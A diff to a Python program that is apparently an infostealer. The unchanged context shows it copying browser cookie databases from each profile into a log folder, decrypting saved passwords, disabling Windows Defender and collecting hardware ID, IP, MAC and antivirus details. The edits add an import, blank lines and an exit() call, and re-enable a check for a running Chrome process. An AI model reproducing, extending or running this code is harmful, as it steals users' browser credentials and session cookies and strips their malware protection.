@@ -24,6 +24,8 @@ from Cryptodome.Random import get_random_bytes
 from Cryptodome.Util.Padding import pad, unpad
 import pytz
 import uuid
+from var_dump import var_dump
+
 
 
 mac_address = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0,2*6,2)][::-1])
@@ -339,17 +341,26 @@ def decryptPassword(ciphertext, secret_key):
         pass
 def start1():
     bc = browser()
+
+
     cookie = []
     for bs in bc:
+
         if os.path.exists(bs['path']):
+
             for profile in bs['profile']:
+
+
                 try:
                     if os.path.exists(os.path.join(bs['path'], profile, 'Network', 'Cookies')):
                         shutil.copyfile(os.path.join(bs['path'], profile, 'Network', 'Cookies'), os.path.join(path_data, 'Log','Cookie '+bs['name']+' '+profile ))
                         cookie.append({'path':os.path.join(path_data, 'Log','Cookie '+bs['name']+' '+profile ),'pathkey':bs['path'],'name':bs['name'],'profile':profile})
+                       
                 except:pass
+            exit()
         else:
             pass
+
     return cookie
 def start2():
     bc = browser()
@@ -552,11 +563,8 @@ async def main(TOKEN, ID):
     disable_defender()
     computer_os, cpu, gpu, ram, username, hostname, hwid, ip, interface, mac, language, antivirus = pcinfo()
     country = get_country(ip)
-
-
     
-    # check_chrome_running()
-
+    check_chrome_running()
 
 
     extract()
